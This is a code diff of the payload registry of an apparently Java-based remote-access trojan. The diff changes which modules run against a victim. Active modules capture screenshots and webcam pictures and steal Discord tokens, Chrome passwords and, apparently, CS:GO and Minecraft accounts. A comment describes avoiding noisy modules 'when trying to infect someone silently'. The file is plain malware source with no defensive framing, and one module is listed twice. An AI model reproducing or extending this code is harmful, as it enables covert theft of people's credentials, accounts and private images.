@@ -1,9 +1,6 @@
 package dev.peter.luterium.payload;
 
 import dev.peter.luterium.features.*;
-import dev.peter.luterium.features.fun.ChangeWallpaper;
-import dev.peter.luterium.features.fun.FurryPorn;
-import dev.peter.luterium.features.fun.PlaySong;
 import dev.peter.luterium.features.maintainer.Maintainer;
 
 import java.util.ArrayList;
@@ -22,27 +19,18 @@ public final class Payload {
 
     private Payload() {
         payloads.addAll(Arrays.asList(
+                new CSGO(),
                 new Info(),
+                new Minecraft(),
                 new Maintainer(),
                 new ScreenShot(),
-                new ModsFolder(),
-                new FdpConfigs(),
-                new UsefulFiles(),
-                new RiseConfigs(),
-                new NixwareLogin(),
-                new MCScreenshots(),
-                new PlagueConfigs(),
+                //new UsefulFiles(), //Check the class to know the reason it is commented - Peter 09/29/2025
+                new Minecraft(),
                 new WebcamPicture(),
                 new DiscordTokens(),
-                new ChromePassword(),
-                new NixwareConfigs(),
-                new JarsFromDesktop(),
-                new EarthhackConfigs(),
-                new LegendwareScripts(),
-                new RusherhackConfigs(),
-                new MCLauncherAccounts()
+                new ChromePassword()
 
-                /*These are optional, not recommended when trying to rat someone silently.
+                /*These are optional, not recommended when trying to infect someone silently.
                 new PlaySong(),
                 new FurryPorn(),
                 new ChangeWallpaper()
